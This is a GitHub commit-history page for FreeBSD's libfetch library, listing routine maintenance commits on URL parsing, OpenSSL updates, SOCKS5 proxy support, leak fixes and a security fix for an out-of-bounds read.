=== Content from github.com_9192263c_20250115_093446.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffreebsd%2Ffreebsd-src%2Fcommits%2Fmain%2Flib%2Flibfetch)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffreebsd%2Ffreebsd-src%2Fcommits%2Fmain%2Flib%2Flibfetch)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fcommits%2Fshow&source=header-repo&source_repo=freebsd%2Ffreebsd-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[freebsd](/freebsd)
/
**[freebsd-src](/freebsd/freebsd-src)**
Public

* [Notifications](/login?return_to=%2Ffreebsd%2Ffreebsd-src) You must be signed in to change notification settings
* [Fork
  2.9k](/login?return_to=%2Ffreebsd%2Ffreebsd-src)
* [Star
   8.1k](/login?return_to=%2Ffreebsd%2Ffreebsd-src)

* [Code](/freebsd/freebsd-src)
* [Pull requests
  67](/freebsd/freebsd-src/pulls)
* [Actions](/freebsd/freebsd-src/actions)
* [Security](/freebsd/freebsd-src/security)
* [Insights](/freebsd/freebsd-src/pulse)

Additional navigation options

* [Code](/freebsd/freebsd-src)
* [Pull requests](/freebsd/freebsd-src/pulls)
* [Actions](/freebsd/freebsd-src/actions)
* [Security](/freebsd/freebsd-src/security)
* [Insights](/freebsd/freebsd-src/pulse)

# Commits

## Breadcrumbs

History for

1. [freebsd-src](/freebsd/freebsd-src/commits)
2. [lib](/freebsd/freebsd-src/commits/main/lib)
3. [libfetch](/freebsd/freebsd-src/commits/main/lib/libfetch)
on[main](/freebsd/freebsd-src/tree/main)
## User selector

All users
## Datepicker

All time
## Commit History

### Commits on Aug 21, 2024

* #### [libfetch: don't include fragments in HTTP requests](/freebsd/freebsd-src/commit/1af7d5f389536a2f391153513d95d92ffdf360e4 "libfetch: don't include fragments in HTTP requests Summary: Fragments are reserved for client-side processing, see https://www.rfc-editor.org/rfc/rfc9110.html#section-7.1 Also, some servers don't like to receive HTTP requests with fragments. ``` $ fetch 'https://dropbox.com/a/b' fetch: https://dropbox.com/a/b: Not Found $ fetch 'https://dropbox.com/a/b#' fetch: https://dropbox.com/a/b#: Bad Request ``` This is a real-world scenario, where some download link from dropbox (eventually) redirects to an URL with a fragment: ``` $ fetch -v 'https://www.dropbox.com/sh/<some>/<thing>?dl=1' 2>&1 | grep requesting requesting https://www.dropbox.com/sh/<some>/<thing>?dl=1 requesting https://www.dropbox.com/scl/fo/<foo>/<bar>?rlkey=<baz>&dl=1 requesting https://<boo>.dl.dropboxusercontent.com/zip_download_get/<some-long-strig># ``` See how the last redirect ends with a `#`. Currently, libfetch includes the ending fragment and makes it impossible to download the file. Differential Revision: https://reviews.freebsd.org/D46318 MFC after: 2 weeks")

  Show description for 1af7d5f[![gahr](https://avatars.githubusercontent.com/u/959474?v=4&size=32)](/gahr)[gahr](/freebsd/freebsd-src/commits?author=gahr)committed[1af7d5f](/freebsd/freebsd-src/commit/1af7d5f389536a2f391153513d95d92ffdf360e4)Copy full SHA for 1af7d5f
### Commits on Jul 15, 2024

* #### [Remove residual blank line at start of Makefile](/freebsd/freebsd-src/commit/e9ac41698b2f322d55ccf9da50a3596edb2c1800 "Remove residual blank line at start of Makefile This is a residual of the $FreeBSD$ removal. MFC After: 3 days (though I'll just run the command on the branches) Sponsored by: Netflix")

  Show description for e9ac416[![bsdimp](https://avatars.githubusercontent.com/u/4139006?v=4&size=32)](/bsdimp)[bsdimp](/freebsd/freebsd-src/commits?author=bsdimp)committed[e9ac416](/freebsd/freebsd-src/commit/e9ac41698b2f322d55ccf9da50a3596edb2c1800)Copy full SHA for e9ac416
### Commits on Jul 11, 2024

* #### [libfetch: parse IPv4address in IPv6address properly](/freebsd/freebsd-src/commit/8cd71a0e01d60cc4eb0cdef3c62556a516976b77 "libfetch: parse IPv4address in IPv6address properly This fix parsing problems of IPv6 addresses which contains IPv4 addresses. One example is ::192.168.0.1. Documents are in below: https://datatracker.ietf.org/doc/html/rfc2373#page-22 Sponsored by: Juniper Networks, Inc. MFC after: 1 week Reviewed by: jhibbits Differential Revision: https://reviews.freebsd.org/D45896")

  Show description for 8cd71a0[![khng300](https://avatars.githubusercontent.com/u/33683255?v=4&size=32)](/khng300)[khng300](/freebsd/freebsd-src/commits?author=khng300)committed[8cd71a0](/freebsd/freebsd-src/commit/8cd71a0e01d60cc4eb0cdef3c62556a516976b77)Copy full SHA for 8cd71a0
### Commits on Mar 25, 2024

* #### [libfetch: parse scheme://domain:/ correctly](/freebsd/freebsd-src/commit/fb860ed0c52c2c1e7792ef86718620a439663c7f "libfetch: parse scheme://domain:/ correctly This improves URL-parsing compability with cURL, and unbreaks parsing of similar kinds of URLs after commit 8d9de5b10a24. Sponsored by: Juniper Networks, Inc. Reviewed by: des MFC after: 1 week Differential Revision: https://reviews.freebsd.org/D44493")

  Show description for fb860ed[![khng300](https://avatars.githubusercontent.com/u/33683255?v=4&size=32)](/khng300)[khng300](/freebsd/freebsd-src/commits?author=khng300)committed[fb860ed](/freebsd/freebsd-src/commit/fb860ed0c52c2c1e7792ef86718620a439663c7f)Copy full SHA for fb860ed
### Commits on Feb 3, 2024

* #### [lib/libfetch/common.c: remove an extra semicolon](/freebsd/freebsd-src/commit/fb3dc55a5c22a619686ce667bcbe8a4c84a3ce34 "lib/libfetch/common.c: remove an extra semicolon Signed-off-by: rilysh <nightquick@proton.me> Reviewed by: imp Pull Request: https://github.com/freebsd/freebsd-src/pull/959")

  Show description for fb3dc55 ![rilysh](https://avatars.githubusercontent.com/u/71683721?v=4&size=32)![bsdimp](https://avatars.githubusercontent.com/u/4139006?v=4&size=32)[rilysh](/freebsd/freebsd-src/commits?author=rilysh)authored and[bsdimp](/freebsd/freebsd-src/commits?author=bsdimp)committed[fb3dc55](/freebsd/freebsd-src/commit/fb3dc55a5c22a619686ce667bcbe8a4c84a3ce34)Copy full SHA for fb3dc55
### Commits on Nov 27, 2023

* #### [lib: Automated cleanup of cdefs and other formatting](/freebsd/freebsd-src/commit/a2f733abcff64628b7771a47089628b7327a88bd "lib: Automated cleanup of cdefs and other formatting Apply the following automated changes to try to eliminate no-longer-needed sys/cdefs.h includes as well as now-empty blank lines in a row. Remove /^#if.*\n#endif.*\n#include\s+<sys/cdefs.h>.*\n/ Remove /\n+#include\s+<sys/cdefs.h>.*\n+#if.*\n#endif.*\n+/ Remove /\n+#if.*\n#endif.*\n+/ Remove /^#if.*\n#endif.*\n/ Remove /\n+#include\s+<sys/cdefs.h>\n#include\s+<sys/types.h>/ Remove /\n+#include\s+<sys/cdefs.h>\n#include\s+<sys/param.h>/ Remove /\n+#include\s+<sys/cdefs.h>\n#include\s+<sys/capsicum.h>/ Sponsored by: Netflix")

  Show description for a2f733a[![bsdimp](https://avatars.githubusercontent.com/u/4139006?v=4&size=32)](/bsdimp)[bsdimp](/freebsd/freebsd-src/commits?author=bsdimp)committed[a2f733a](/freebsd/freebsd-src/commit/a2f733abcff64628b7771a47089628b7327a88bd)Copy full SHA for a2f733a
### Commits on Oct 8, 2023

* #### [libfetch, fetch: Stop recommending the use of ca\_root\_nss.](/freebsd/freebsd-src/commit/2821a7498f65d357c68166e1978b491abef1ca4a "libfetch, fetch: Stop recommending the use of ca_root_nss. MFC after: 3 days Reviewed by: kevans, emaste Differential Revision: https://reviews.freebsd.org/D42119")

  Show description for 2821a74[![dag-erling](https://avatars.githubusercontent.com/u/4972155?v=4&size=32)](/dag-erling)[dag-erling](/freebsd/freebsd-src/commits?author=dag-erling)committed[2821a74](/freebsd/freebsd-src/commit/2821a7498f65d357c68166e1978b491abef1ca4a)Copy full SHA for 2821a74
### Commits on Oct 3, 2023

* #### [libfetch: don't rely on ca\_root\_nss for certificate validation](/freebsd/freebsd-src/commit/09f5c1e118bb4eca77b83a0d08f559b20f60aa59 "libfetch: don't rely on ca_root_nss for certificate validation Before certctl(8), there was no system trust store, and libfetch relied on the CA certificate bundle from the ca_root_nss port to verify peers. We now have a system trust store and a reliable mechanism for manipulating it (to explicitly add, remove, or revoke certificates), but if ca_root_nss is installed, libfetch will still prefer that to the system trust store. With this change, unless explicitly overridden, libfetch will rely on OpenSSL to pick up the default system trust store. PR: 256902 MFC after: 3 days Reviewed by: kevans Differential Revision: https://reviews.freebsd.org/D42059")

  Show description for 09f5c1e ![michael-o](https://avatars.githubusercontent.com/u/573017?v=4&size=32)![dag-erling](https://avatars.githubusercontent.com/u/4972155?v=4&size=32)[michael-o](/freebsd/freebsd-src/commits?author=michael-o)authored and[dag-erling](/freebsd/freebsd-src/commits?author=dag-erling)committed[09f5c1e](/freebsd/freebsd-src/commit/09f5c1e118bb4eca77b83a0d08f559b20f60aa59)Copy full SHA for 09f5c1e
### Commits on Aug 16, 2023

* #### [Remove $FreeBSD$: two-line nroff pattern](/freebsd/freebsd-src/commit/fa9896e082a1046ff4fbc75fcba4d18d1f2efc19 "Remove $FreeBSD$: two-line nroff pattern Remove /^\.\\\"\n\.\\\"\s*\$FreeBSD\$$\n/")

  Show description for fa9896e[![bsdimp](https://avatars.githubusercontent.com/u/4139006?v=4&size=32)](/bsdimp)[bsdimp](/freebsd/freebsd-src/commits?author=bsdimp)committed[fa9896e](/freebsd/freebsd-src/commit/fa9896e082a1046ff4fbc75fcba4d18d1f2efc19)Copy full SHA for fa9896e
* #### [Remove $FreeBSD$: one-line sh pattern](/freebsd/freebsd-src/commit/d0b2dbfa0ecf2bbc9709efc5e20baf8e4b44bbbf "Remove $FreeBSD$: one-line sh pattern Remove /^\s*#[#!]?\s*\$FreeBSD\$.*$\n/")

  Show description for d0b2dbf[![bsdimp](https://avatars.githubusercontent.com/u/4139006?v=4&size=32)](/bsdimp)[bsdimp](/freebsd/freebsd-src/commits?author=bsdimp)committed[d0b2dbf](/freebsd/freebsd-src/commit/d0b2dbfa0ecf2bbc9709efc5e20baf8e4b44bbbf)Copy full SHA for d0b2dbf
* #### [Remove $FreeBSD$: one-line .c pattern](/freebsd/freebsd-src/commit/1d386b48a555f61cb7325543adbbb5c3f3407a66 "Remove $FreeBSD$: one-line .c pattern Remove /^[\s*]*__FBSDID\(\"\$FreeBSD\$\"\);?\s*\n/")

  Show description for 1d386b4[![bsdimp](https://avatars.githubusercontent.com/u/4139006?v=4&size=32)](/bsdimp)[bsdimp](/freebsd/freebsd-src/commits?author=bsdimp)committed[1d386b4](/freebsd/freebsd-src/commit/1d386b48a555f61cb7325543adbbb5c3f3407a66)Copy full SHA for 1d386b4
* #### [Remove $FreeBSD$: two-line .h pattern](/freebsd/freebsd-src/commit/b3e7694832e81d7a904a10f525f8797b753bf0d3 "Remove $FreeBSD$: two-line .h pattern Remove /^\s*\*\n \*\s+\$FreeBSD\$$\n/")

  Show description for b3e7694[![bsdimp](https://avatars.githubusercontent.com/u/4139006?v=4&size=32)](/bsdimp)[bsdimp](/freebsd/freebsd-src/commits?author=bsdimp)committed[b3e7694](/freebsd/freebsd-src/commit/b3e7694832e81d7a904a10f525f8797b753bf0d3)Copy full SHA for b3e7694
### Commits on Jun 24, 2023

* #### [libfetch: remove all old OpenSSL support](/freebsd/freebsd-src/commit/bc1027a7785166fde9c2a3b48e6e70d198377d4b "libfetch: remove all old OpenSSL support This change removes pre-OpenSSL 1.1 supporting code and removes/adjusted preprocessor conditionals which were tautilogically true as FreeBSD main has shipped with OpenSSL 1.1+ for some time. Reviewed by: emaste Differential Revision: https://reviews.freebsd.org/D40711")

  Show description for bc1027a[![ngie-eign](https://avatars.githubusercontent.com/u/1574099?v=4&size=32)](/ngie-eign)[ngie-eign](/freebsd/freebsd-src/commits?author=ngie-eign)committed[bc1027a](/freebsd/freebsd-src/commit/bc1027a7785166fde9c2a3b48e6e70d198377d4b)Copy full SHA for bc1027a
### Commits on May 25, 2023

* #### [libfetch: specify OpenSSL 1.1 APIs](/freebsd/freebsd-src/commit/77d788e23d0964053b81b5de307fa04bd1ccadc5 "libfetch: specify OpenSSL 1.1 APIs OPENSSL_API_COMPAT can be used to specify the OpenSSL API version in use for the purpose of hiding deprecated interfaces and enabling the appropriate deprecation notices. This change is a NFC while we're still using OpenSSL 1.1.1 but will avoid deprecation warnings upon the switch to OpenSSL 3.0. Future work should migrate to use the OpenSSL 3.0 APIs. PR: 271615 Reviewed by: emaste Event: Kitchener-Waterloo Hackathon 202305 Sponsored by: The FreeBSD Foundation")

  Show description for 77d788e ![khorben](https://avatars.githubusercontent.com/u/1081724?v=4&size=32)![emaste](https://avatars.githubusercontent.com/u/1034582?v=4&size=32)[khorben](/freebsd/freebsd-src/commits?author=khorben)authored and[emaste](/freebsd/freebsd-src/commits?author=emaste)committed[77d788e](/freebsd/freebsd-src/commit/77d788e23d0964053b81b5de307fa04bd1ccadc5)Copy full SHA for 77d788e
* #### [libfetch: do not call deprecated OpenSSL functions](/freebsd/freebsd-src/commit/01aee8c92d936470c44821736e0d9e11ed7ce812 "libfetch: do not call deprecated OpenSSL functions As of OpenSSL 1.1 SSL_library_init() and SSL_load_error_strings() are deprecated. There are replacement initialization functions but they do not need to be called: \"As of version 1.1.0 OpenSSL will automatically allocate all resources that it needs so no explicit initialisation is required.\" Wrap both calls in an OPENSSL_VERSION_NUMBER block. PR: 271615 Reviewed by: Pierre Pronchery <pierre@freebsdfoundation.org> Event: Kitchener-Waterloo Hackathon 202305 Sponsored by: The FreeBSD Foundation Differential Revision: https://reviews.freebsd.org/D40265")

  Show description for 01aee8c[![emaste](https://avatars.githubusercontent.com/u/1034582?v=4&size=32)](/emaste)[emaste](/freebsd/freebsd-src/commits?author=emaste)committed[01aee8c](/freebsd/freebsd-src/commit/01aee8c92d936470c44821736e0d9e11ed7ce812)Copy full SHA for 01aee8c
### Commits on Nov 16, 2022

* #### [libfetch: Pass a zeroed digest to DigestCalcResponse.](/freebsd/freebsd-src/commit/57fbafb8deac75b924faf1fa6c2222a7719fdfec "libfetch: Pass a zeroed digest to DigestCalcResponse. GCC 12 warns that passing \"\" (a constant of char[1]) to a parameter of type char[33] could potentially overread. It is not clear from the context that c->qops can never be \"auth-int\" (and if it can't, then the \"auth-int\" handling in DigestCalcResponse is dead code that should be removed since this is the only place the function is called). Reviewed by: emaste Differential Revision: https://reviews.freebsd.org/D36825")

  Show description for 57fbafb[![bsdjhb](https://avatars.githubusercontent.com/u/8976613?v=4&size=32)](/bsdjhb)[bsdjhb](/freebsd/freebsd-src/commits?author=bsdjhb)committed[57fbafb](/freebsd/freebsd-src/commit/57fbafb8deac75b924faf1fa6c2222a7719fdfec)Copy full SHA for 57fbafb
### Commits on Nov 2, 2022

* #### [fetch: support EAI\_ADDRFAMILY error, correct two error messages](/freebsd/freebsd-src/commit/631b82aca0fd41c8e0d48eebdb9c4e38b7306472 "fetch: support EAI_ADDRFAMILY error, correct two error messages With the change to return EAI_ADDRFAMILY from getaddrinfo(), fetch would print \"Unknown resolver error\" for that error. Add that error and its string to libfetch's table, using an #ifdef just in case. Correct error strings for EAI_NODATA (although it is currently unused) and EAI_NONAME. Should maybe rework the code to use gai_strerror(3), but that doesn't map directly, and the current strings are shortened. Reviewed in https://reviews.freebsd.org/D37139 with related changes. Reviewed by: bz MFC after: 1 month")

  Show description for 631b82a ![Mike Karels](https://github.githubassets.com/images/gravatars/gravatar-user-420.png?size=32)![Mike Karels](https://github.githubassets.com/images/gravatars/gravatar-user-420.png?size=32)Mike Karelsauthored andMike Karelscommitted[631b82a](/freebsd/freebsd-src/commit/631b82aca0fd41c8e0d48eebdb9c4e38b7306472)Copy full SHA for 631b82a
### Commits on Oct 3, 2022

* #### [libfetch: Use memcpy in place of an odd strncpy.](/freebsd/freebsd-src/commit/611cf392672cf7aa52a593412fb2537546a7d6a4 "libfetch: Use memcpy in place of an odd strncpy. The length passed to strncpy is the length of the source string, not the destination buffer. This triggers a non-fatal warning in GCC 12. Hoewver, the code is also odd. It is really just a memcpy of the string without its nul terminator. For that use case, memcpy is clearer. Reviewed by: imp, emaste Differential Revision: https://reviews.freebsd.org/D36824")

  Show description for 611cf39[![bsdjhb](https://avatars.githubusercontent.com/u/8976613?v=4&size=32)](/bsdjhb)[bsdjhb](/freebsd/freebsd-src/commits?author=bsdjhb)committed[611cf39](/freebsd/freebsd-src/commit/611cf392672cf7aa52a593412fb2537546a7d6a4)Copy full SHA for 611cf39
### Commits on Sep 17, 2022

* #### [There's no PEM(3) anywhere around; delete reference.](/freebsd/freebsd-src/commit/ed5e7fb16c01613bb23ed6992957ece990d6a48b "There's no PEM(3) anywhere around; delete reference.")

   ![Jens Schweikhardt](https://github.githubassets.com/images/gravatars/gravatar-user-420.png?size=32)![Jens Schweikhardt](https://github.githubassets.com/images/gravatars/gravatar-user-420.png?size=32)Jens Schweikhardtauthored andJens Schweikhardtcommitted[ed5e7fb](/freebsd/freebsd-src/commit/ed5e7fb16c01613bb23ed6992957ece990d6a48b)Copy full SHA for ed5e7fb
### Commits on Apr 20, 2022

* #### [libfetch: remove a set-but-not-uswed variable](/freebsd/freebsd-src/commit/ce700f78f7fb28a252978382a1d0a66d08b6469a "libfetch: remove a set-but-not-uswed variable")

  [![stesser](https://avatars.githubusercontent.com/u/6264546?v=4&size=32)](/stesser)[stesser](/freebsd/freebsd-src/commits?author=stesser)committed[ce700f7](/freebsd/freebsd-src/commit/ce700f78f7fb28a252978382a1d0a66d08b6469a)Copy full SHA for ce700f7
### Commits on Dec 21, 2021

* #### [pkgbase: Create a FreeBSD-fetch package](/freebsd/freebsd-src/commit/13ef8134efd1c0a39c2dab0197b5c4558101253e "pkgbase: Create a FreeBSD-fetch package It's useful for small image to fetch some data but we don't want to install utilities nor bloat runtime. MFC after: 2 weeks Sponsored by: Beckhoff Automation GmbH & Co. KG Differential Revision: https://reviews.freebsd.org/D33463")

  Show description for 13ef813[![evadot](https://avatars.githubusercontent.com/u/3378808?v=4&size=32)](/evadot)[evadot](/freebsd/freebsd-src/commits?author=evadot)committed[13ef813](/freebsd/freebsd-src/commit/13ef8134efd1c0a39c2dab0197b5c4558101253e)Copy full SHA for 13ef813
### Commits on Sep 9, 2021

* #### [fetch: do not confuse capacity and length](/freebsd/freebsd-src/commit/635eb7ac7990a2bb29e1992b739617a9db012bf2 "fetch: do not confuse capacity and length The patch converting fetch to getline (ee3ca711a898cf41330c320826ea1e0e6e451f1d), did confuse the capacity of the line buffer with the actual len of the read line confusing fetch -v.")

  Show description for 635eb7a[![bapt](https://avatars.githubusercontent.com/u/103607?v=4&size=32)](/bapt)[bapt](/freebsd/freebsd-src/commits?author=bapt)committed[635eb7a](/freebsd/freebsd-src/commit/635eb7ac7990a2bb29e1992b739617a9db012bf2)Copy full SHA for 635eb7a
### Commits on Aug 24, 2021

* #### [Fix libfetch out of bounds read.](/freebsd/freebsd-src/commit/64ae2f785e0672286901c15045a24cbc533538d3 "Fix libfetch out of bounds read. Approved by: so Security: SA-21:15.libfetch Security: CVE-2021-36159")

  Show description for 64ae2f7[![tetlowgm](https://avatars.githubusercontent.com/u/10554352?v=4&size=32)](/tetlowgm)[tetlowgm](/freebsd/freebsd-src/commits?author=tetlowgm)committed[64ae2f7](/freebsd/freebsd-src/commit/64ae2f785e0672286901c15045a24cbc533538d3)Copy full SHA for 64ae2f7
### Commits on Aug 17, 2021

* #### [libfetch: use more portable getline() interface](/freebsd/freebsd-src/commit/ee3ca711a898cf41330c320826ea1e0e6e451f1d "libfetch: use more portable getline() interface this is for better portability in order to avoid using a function which is BSD-only or available via libbsd MFC after: 3 weeks")

  Show description for ee3ca71 ![q66](https://avatars.githubusercontent.com/u/222373?v=4&size=32)![bapt](https://avatars.githubusercontent.com/u/103607?v=4&size=32)[q66](/freebsd/freebsd-src/commits?author=q66)authored and[bapt](/freebsd/freebsd-src/commits?author=bapt)committed[ee3ca71](/freebsd/freebsd-src/commit/ee3ca711a898cf41330c320826ea1e0e6e451f1d)Copy full SHA for ee3ca71
### Commits on Apr 1, 2021

* #### [libfetch: Retry with proxy auth when server returns 407](/freebsd/freebsd-src/commit/345c30a94f6425954163f1e0b075a75f603d27cd "libfetch: Retry with proxy auth when server returns 407 PR: 220468 Submitted by: Egil Hasting <egil.hasting@higen.org> (based on) Reviewed by: kevans, kp Approved by: kp MFC after: 2 weeks Sponsored by: Rubicon Communications, LLC (\"Netgate\") Differential Revision: https://reviews.freebsd.org/D29533")

  Show description for 345c30a[![rbgarga](https://avatars.githubusercontent.com/u/149872?v=4&size=32)](/rbgarga)[rbgarga](/freebsd/freebsd-src/commits?author=rbgarga)committed[345c30a](/freebsd/freebsd-src/commit/345c30a94f6425954163f1e0b075a75f603d27cd)Copy full SHA for 345c30a
### Commits on Nov 24, 2020

* #### [Remove support for SSLv3 from fetch(3).](/freebsd/freebsd-src/commit/fe85238ef758d1adead72be009d07c597fdba0bb "Remove support for SSLv3 from fetch(3). Support for SSLv3 was already removed from OpenSSL (r361392). Differential Revision: https://reviews.freebsd.org/D24947")

  Show description for fe85238[![juikim](https://avatars.githubusercontent.com/u/1071564?v=4&size=32)](/juikim)[juikim](/freebsd/freebsd-src/commits?author=juikim)committed[fe85238](/freebsd/freebsd-src/commit/fe85238ef758d1adead72be009d07c597fdba0bb)Copy full SHA for fe85238
### Commits on Oct 27, 2020

* #### [Replace literal uses of /usr/local in C sources with \_PATH\_LOCALBASE](/freebsd/freebsd-src/commit/1f474190fc280d4a4ef0c214e4d7fff0d1237e22 "Replace literal uses of /usr/local in C sources with _PATH_LOCALBASE Literal references to /usr/local exist in a large number of files in the FreeBSD base system. Many are in contributed software, in configuration files, or in the documentation, but 19 uses have been identified in C source files or headers outside the contrib and sys/contrib directories. This commit makes it possible to set _PATH_LOCALBASE in paths.h to use a different prefix for locally installed software. In order to avoid changes to openssh source files, LOCALBASE is passed to the build via Makefiles under src/secure. While _PATH_LOCALBASE could have been used here, there is precedent in the construction of the path used to a xauth program which depends on the LOCALBASE value passed on the compiler command line to select a non-default directory. This could be changed in a later commit to make the openssh build consistently use _PATH_LOCALBASE. It is considered out-of-scope for this commit. Reviewed by: imp MFC after: 1 month Differential Revision: https://reviews.freebsd.org/D26942")

  Show description for 1f47419[![stesser](https://avatars.githubusercontent.com/u/6264546?v=4&size=32)](/stesser)[stesser](/freebsd/freebsd-src/commits?author=stesser)committed[1f47419](/freebsd/freebsd-src/commit/1f474190fc280d4a4ef0c214e4d7fff0d1237e22)Copy full SHA for 1f47419
### Commits on Aug 17, 2020

* #### [Don't explicitly specify c99 or gnu99 as the default is now gnu99.](/freebsd/freebsd-src/commit/941791759c2cb64e4884579b7a7cc5fb21feec26 "Don't explicitly specify c99 or gnu99 as the default is now gnu99. MFC after: 2 weeks")

  Show description for 9417917[![delphij](https://avatars.githubusercontent.com/u/1045626?v=4&size=32)](/delphij)[delphij](/freebsd/freebsd-src/commits?author=delphij)committed[9417917](/freebsd/freebsd-src/commit/941791759c2cb64e4884579b7a7cc5fb21feec26)Copy full SHA for 9417917
### Commits on Feb 21, 2020

* #### [fetch(3): plug some leaks](/freebsd/freebsd-src/commit/5ac6a2c94d36c885f1cdfd473b3bdcdf4c446082 "fetch(3): plug some leaks In the successful case, sockshost is not freed prior to return. The failure case can now be hit after fetch_reopen(), which was not true before. Thus, we need to make sure to clean up all of the conn resources which will also close sd. For all of the points prior to fetch_reopen(), we continue to just close sd. CID: 1419598, 1419616")

  Show description for 5ac6a2c[![kevans91](https://avatars.githubusercontent.com/u/646318?v=4&size=32)](/kevans91)[kevans91](/freebsd/freebsd-src/commits?author=kevans91)committed[5ac6a2c](/freebsd/freebsd-src/commit/5ac6a2c94d36c885f1cdfd473b3bdcdf4c446082)Copy full SHA for 5ac6a2c
### Commits on Feb 15, 2020

* #### [fetch(3): don't leak sockshost on failure](/freebsd/freebsd-src/commit/86fd2105dcebdecbcaf36d634d79515ace012e8f "fetch(3): don't leak sockshost on failure fetch_socks5_getenv will allocate memory for the host (or set it to NULL) in all cases through the function; the caller is responsible for freeing it if we end up allocating. While I'm here, I've eliminated a label that just jumps to the next line...")

  Show description for 86fd210[![kevans91](https://avatars.githubusercontent.com/u/646318?v=4&size=32)](/kevans91)[kevans91](/freebsd/freebsd-src/commits?author=kevans91)committed[86fd210](/freebsd/freebsd-src/commit/86fd2105dcebdecbcaf36d634d79515ace012e8f)Copy full SHA for 86fd210
* #### [fetch(3): fix regression in IPv6:port spec from r357977](/freebsd/freebsd-src/commit/3dc455e8974c1a4723f6703f47b2f667a61c934b "fetch(3): fix regression in IPv6:port spec from r357977 In case the port was specified, we never actually populated *host. Do so now. Pointy hat: kevans")

  Show description for 3dc455e[![kevans91](https://avatars.githubusercontent.com/u/646318?v=4&size=32)](/kevans91)[kevans91](/freebsd/freebsd-src/commits?author=kevans91)committed[3dc455e](/freebsd/freebsd-src/commit/3dc455e8974c1a4723f6703f47b2f667a61c934b)Copy full SHA for 3dc455e
* #### [fetch(3): move bits of fetch\_socks5\_getenv around](/freebsd/freebsd-src/commit/0f3fa96016c82f700733941d4c148cefff4c4f1c "fetch(3): move bits of fetch_socks5_getenv around This commit separates out port parsing and validation from grabbing the host from the env var. The only related bit really is that we need to be more specific with the delimiter in the IPv6 case.")

  Show description for 0f3fa96[![kevans91](https://avatars.githubusercontent.com/u/646318?v=4&size=32)](/kevans91)[kevans91](/freebsd/freebsd-src/commits?author=kevans91)committed[0f3fa96](/freebsd/freebsd-src/commit/0f3fa96016c82f700733941d4c148cefff4c4f1c)Copy full SHA for 0f3fa96
* #### [fetch(3): Add SOCKS5 support](/freebsd/freebsd-src/commit/c44be5aa0a9e889c2ebde73986acabdaab952c65 "fetch(3): Add SOCKS5 support This change adds SOCKS5 support to the library fetch(3) and updates the man page. Details: Within the fetch_connect() function, fetch(3) checks if the SOCKS5_PROXY environment variable is set. If so, it connects to this host rather than the end-host. It then initializes the SOCKS5 connection in accordance with RFC 1928 and returns the resulting conn_t (file descriptor) for usage by the regular FTP/HTTP handlers. Design Decision: This change defaults all DNS resolutions through the proxy by sending all IPs as hostnames. Going forward, another feature might be to create another environmental variable to toggle resolutions through the proxy or not.. One may set the SOCKS5_PROXY environment variable in any of the formats: SOCKS5_PROXY=proxy.example.com SOCKS5_PROXY=proxy.example.com:1080 SOCKS5_PROXY=192.0.2.0 SOCKS5_PROXY=198.51.100.0:1080 SOCKS5_PROXY=[2001:db8::1] SOCKS5_PROXY=[2001:db8::2]:1080 Then perform a request with fetch(1). (note by kevans) I've since been informed that Void Linux/xbps has a fork of libfetch that also implements SOCKS5. I may compare/contrast the two in the mid-to-near future. Submitted by: Farhan Khan <farhan farhan codes> Differential Revision: https://reviews.freebsd.org/D18908")

